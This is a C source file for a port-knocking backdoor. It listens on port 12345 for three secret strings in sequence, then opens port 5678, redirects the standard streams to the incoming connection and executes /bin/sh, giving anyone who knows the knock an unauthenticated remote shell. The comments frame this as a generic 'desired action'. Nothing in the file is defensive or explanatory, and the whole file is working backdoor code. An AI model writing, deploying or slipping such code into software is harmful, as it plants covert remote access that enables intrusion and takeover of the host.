#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <errno.h>

#define PORT_TO_KNOCK 12345
#define OPEN_PORT 5678

// Define the expected sequence of packet types
#define EXPECTED_SEQUENCE_SIZE 3
const char *EXPECTED_SEQUENCE[EXPECTED_SEQUENCE_SIZE] = {"nqXCT2xfFsvYktHG3d8gPV", "VqhEGfaeFTdSmUW7M4QkNz", "VXjdmp4QcBtH75S2Yf8gPx"};
const int INTERVALS[EXPECTED_SEQUENCE_SIZE] = {1, 2, 3}; // Intervals in seconds

void error(char *message) {
    perror(message);
    exit(EXIT_FAILURE);
}

void perform_action() {
    // This is where you implement the desired action when a valid knocking sequence is received.
    // For example, open the desired port or execute a specific command.
    printf("Action: Opening communication on port %d\n", OPEN_PORT);
    int sockfd, newsockfd;
    struct sockaddr_in serv_addr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        error("ERROR opening socket");
    }

    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_port = htons(5678);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
        error("ERROR binding socket");
    }

    listen(sockfd, 0);
    newsockfd = accept(sockfd, NULL, NULL);
    if (newsockfd < 0) {
        error("ERROR accepting connection");
    }

    for (int i = 0; i < 3; i++) {
        if (dup2(newsockfd, i) < 0) {
            error("ERROR redirecting file descriptors");
            if (close(newsockfd) < 0) {
                error("ERROR closing newsockfd");
            }
        }
    }
    if (close(newsockfd) < 0) {
        error("ERROR closing newsockfd");
    }

    char *args[] = {"/bin/bash", NULL};
    if (execve("/bin/sh", args, NULL) < 0) {
        error("ERROR executing shell");
    }
}

int main() {

    int serverSocket, clientSocket;
    struct sockaddr_in serverAddr, clientAddr;
    socklen_t clientLen = sizeof(clientAddr);

    // Create a socket
    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == -1) {
        perror("Socket creation failed");
        exit(1);
    }

    // Configure the server address
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);
    serverAddr.sin_port = htons(PORT_TO_KNOCK);

    // Bind the socket
    if (bind(serverSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == -1) {
        perror("Bind failed");
        exit(1);
    }

    // Listen for incoming connections
    if (listen(serverSocket, 5) == -1) {
        perror("Listen failed");
        exit(1);
    }

    printf("Listening for knocks on port %d...\n", PORT_TO_KNOCK);

    int sequenceIndex = 0;  // Index to track the expected sequence

    while (1) {
        clientSocket = accept(serverSocket, (struct sockaddr *)&clientAddr, &clientLen);
        if (clientSocket == -1) {
            perror("Accept failed");
            exit(1);
        }

        char buffer[1024];
        ssize_t bytesRead = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        if (bytesRead > 0) {
            buffer[bytesRead] = '\0';  // Null-terminate the received data

            // Print information for each received packet
            printf("Received packet on port %d: %s (Interval: %ds)\n", PORT_TO_KNOCK, buffer, INTERVALS[sequenceIndex]);

            // Check if the received packet matches the expected sequence
            if (strcmp(buffer, EXPECTED_SEQUENCE[sequenceIndex]) == 0) {
                sequenceIndex++;

                // Check if the entire expected sequence is received
                if (sequenceIndex == EXPECTED_SEQUENCE_SIZE) {
                    // If yes, perform the desired action
                    printf("Received the complete expected sequence\n");
                    perform_action();

                    // Reset the sequenceIndex for the next round of knocking
                    sequenceIndex = 0;
                }
            } else {
                // Reset the sequenceIndex if the received packet is not as expected
                sequenceIndex = 0;
            }
        }

        close(clientSocket);
    }

    close(serverSocket);

    return 0;
}
